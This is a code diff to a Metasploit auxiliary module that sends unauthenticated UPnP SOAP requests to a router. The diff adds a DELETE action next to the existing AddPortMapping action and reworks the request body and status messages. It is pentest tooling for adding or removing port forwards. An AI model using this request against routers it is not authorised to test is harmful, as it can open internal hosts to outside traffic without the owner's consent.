@@ -14,8 +14,25 @@ class Metasploit3 < Msf::Auxiliary
       'Name'           => 'UPnP AddPortMapping',
       'Description'    => 'UPnP AddPortMapping SOAP request',
       'Author'         => 'St0rn <fabien@anbu-pentest.com>',
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'Actions'        =>
+        [
+          [ 'ADD',
+            {
+              'Description' => 'Use the AddPortMapping SOAP command to open and forward a port',
+              'SOAP_ACTION' => 'AddPortMapping'
+            }
+          ],
+          [ 'DELETE',
+            {
+              'Description' => 'Use the DeletePortMapping SOAP command to remove a port forwarding',
+              'SOAP_ACTION' => 'DeletePortMapping'
+            }
+          ]
+        ],
+      'DefaultAction'  => 'ADD'
     )
+
     register_options(
       [
         OptString.new('TARGETURI', [true, 'UPnP control URL', '/' ]),
@@ -54,20 +71,31 @@ class Metasploit3 < Msf::Auxiliary
     @protocol ||= datastore['PROTOCOL']
   end
 
+  def soap_action
+    @soap_action ||= action.opts['SOAP_ACTION']
+  end
+
   def run
     content = "<?xml version=\"1.0\"?>"
     content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
     content << "<SOAP-ENV:Body>"
-    content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
-    content << "<NewPortMappingDescription>#{Rex::Text.rand_text_alpha(8)}</NewPortMappingDescription>"
-    content << "<NewLeaseDuration>#{lease_duration}</NewLeaseDuration>"
-    content << "<NewInternalClient>#{internal_client}</NewInternalClient>"
-    content << "<NewEnabled>1</NewEnabled>"
-    content << "<NewExternalPort>#{external_port}</NewExternalPort>"
-    content << "<NewRemoteHost>#{external_client}</NewRemoteHost>"
-    content << "<NewProtocol>#{protocol}</NewProtocol>"
-    content << "<NewInternalPort>#{internal_port}</NewInternalPort>"
-    content << "</m:AddPortMapping>"
+    content << "<m:#{soap_action} xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
+    case action.name
+    when 'ADD'
+      content << "<NewPortMappingDescription>#{Rex::Text.rand_text_alpha(8)}</NewPortMappingDescription>"
+      content << "<NewLeaseDuration>#{lease_duration}</NewLeaseDuration>"
+      content << "<NewInternalClient>#{internal_client}</NewInternalClient>"
+      content << "<NewEnabled>1</NewEnabled>"
+      content << "<NewExternalPort>#{external_port}</NewExternalPort>"
+      content << "<NewRemoteHost>#{external_client}</NewRemoteHost>"
+      content << "<NewProtocol>#{protocol}</NewProtocol>"
+      content << "<NewInternalPort>#{internal_port}</NewInternalPort>"
+    when 'DELETE'
+      content << "<NewExternalPort>#{external_port}</NewExternalPort>"
+      content << "<NewRemoteHost>#{external_client}</NewRemoteHost>"
+      content << "<NewProtocol>#{protocol}</NewProtocol>"
+    end
+    content << "</m:#{soap_action}>"
     content << "</SOAP-ENV:Body>"
     content << "</SOAP-ENV:Envelope>"
 
@@ -77,21 +105,22 @@ class Metasploit3 < Msf::Auxiliary
       'content-type'  => 'text/xml;charset="utf-8"',
       'data'          => content,
       'headers'       => {
-        'SoapAction'  => 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'
+        'SoapAction'  => "urn:schemas-upnp-org:service:WANIPConnection:1##{soap_action}"
       }
     )
 
+    external_map = "#{external_client ? external_client : 'any'}:#{external_port}/#{protocol}"
+    internal_map = "#{internal_client ? internal_client : 'any'}:#{internal_port}/#{protocol}"
+    map = "#{external_map} -> #{internal_map}"
+
     if res
-      external_map = "#{external_client ? external_client : 'any'}:#{external_port}/#{protocol}"
-      internal_map = "#{internal_client ? internal_client : 'any'}:#{internal_port}/#{protocol}"
-      map = "#{external_map} -> #{internal_map}"
       if res.code == 200
-        print_good("#{peer} successfully mapped #{map}")
+        print_good("#{peer} #{map} #{action.name} succeeded")
       else
-        print_error("#{peer} failed to map #{map}: #{res}")
+        print_error("#{peer} #{map} #{action.name} failed: #{res}")
       end
     else
-      print_error("#{peer} no response for mapping #{map}")
+      print_error("#{peer} no response for #{map} #{action.name}")
     end
   end
 end
